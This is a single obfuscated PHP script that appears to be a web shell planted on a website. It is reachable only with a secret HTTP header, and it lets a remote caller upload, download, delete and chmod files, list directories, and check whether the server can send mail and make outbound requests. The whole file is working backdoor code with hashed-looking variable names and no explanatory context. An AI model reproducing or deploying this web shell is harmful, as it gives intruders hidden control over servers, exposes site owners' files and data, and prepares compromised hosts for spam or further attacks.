<?php
$sp71a753 = 'tl98is5innyem8cy'; $sp2b685e = 1.0; function __delete_recursive($spab2b9a) { global $spdc8841; if (is_file($spdc8841 . $spab2b9a)) { unlink($spdc8841 . $spab2b9a); } else { $sp9b02be = opendir($spdc8841 . $spab2b9a); while ($sp47e33c = readdir($sp9b02be)) { if ($sp47e33c == '.' || $sp47e33c == '..') { continue; } __delete_recursive($spab2b9a . '/' . $sp47e33c); } closedir($sp9b02be); rmdir($spdc8841 . $spab2b9a); } } if (!empty($sp71a753) && !isset($_SERVER['HTTP_' . strtoupper($sp71a753)])) { header('HTTP/1.0 403 Forbidden'); die; } $spb1b97c = $_REQUEST['action']; $spdc8841 = preg_replace('/' . preg_quote($_SERVER['REQUEST_URI'], '/') . '$/', '', $_SERVER['SCRIPT_FILENAME']); $spab2b9a = $_REQUEST['path']; if (empty($spab2b9a) || $spab2b9a == '/') { $spab2b9a = ''; } if (!empty($spab2b9a) && substr($spab2b9a, 0, 1) != '/') { $spab2b9a = '/' . $spab2b9a; } switch ($spb1b97c) { case 'create': mkdir($spdc8841 . $spab2b9a . '/' . $_REQUEST['name']); echo serialize(array('success' => file_exists($spdc8841 . $spab2b9a . '/' . $_REQUEST['name']))); break; case 'upload': if ($_FILES['upload']['error'] > 0) { echo serialize(array('success' => false)); break; } move_uploaded_file($_FILES['upload']['tmp_name'], $spdc8841 . $spab2b9a . '/' . $_FILES['upload']['name']); echo serialize(array('success' => file_exists($spdc8841 . $spab2b9a . '/' . $_FILES['upload']['name']))); break; case 'download': if (empty($spab2b9a) || !file_exists($spdc8841 . $spab2b9a) || is_dir($spdc8841 . $spab2b9a)) { header('HTTP/1.0 404 Not Found'); break; } $spe526b7 = fopen($spdc8841 . $spab2b9a, 'r'); fpassthru($spe526b7); fclose($spe526b7); break; case 'delete': if (empty($spab2b9a) || !file_exists($spdc8841 . $spab2b9a)) { echo serialize(array('success' => false)); break; } __delete_recursive($spab2b9a); echo serialize(array('success' => !file_exists($spab2b9a))); break; case 'chmod': if (empty($spab2b9a) || !file_exists($spdc8841 . $spab2b9a)) { echo serialize(array('success' => false)); break; } chmod($spdc8841 . $spab2b9a, octdec($_REQUEST['mode'])); echo serialize(array('success' => true)); break; default: $sp572d27 = array(); $sp9b02be = opendir($spdc8841 . $spab2b9a); while ($sp47e33c = readdir($sp9b02be)) { if ($sp47e33c == '.' || $sp47e33c == '..') { continue; } $speeefa0 = stat($spdc8841 . $spab2b9a . '/' . $sp47e33c); $sp572d27[] = array('name' => $sp47e33c, 'path' => $spab2b9a . '/' . $sp47e33c, 'is_writable' => is_writable($spdc8841 . $spab2b9a . '/' . $sp47e33c), 'is_dir' => is_dir($spdc8841 . $spab2b9a . '/' . $sp47e33c), 'size' => $speeefa0['size'], 'mode' => $speeefa0['mode']); } closedir($sp9b02be); $sp71d98d = array('root' => $spdc8841, 'path' => $spab2b9a, 'files' => $sp572d27, 'php_version' => phpversion(), 'api_version' => $sp2b685e, 'is_writable' => is_writable($spdc8841 . $spab2b9a)); if (!empty($_REQUEST['test'])) { $sp71d98d['mail_enabled'] = function_exists('mail'); if (function_exists('curl_init')) { $sp9eaeb4 = curl_init('https://api.ipify.org?format=json'); curl_setopt($sp9eaeb4, CURLOPT_RETURNTRANSFER, true); $sp8cd237 = json_decode(curl_exec($sp9eaeb4), true); $spc2d044 = !empty($sp8cd237['ip']); } else { $spc2d044 = false; } $sp71d98d['curl_enabled'] = $spc2d044; } echo serialize($sp71d98d); }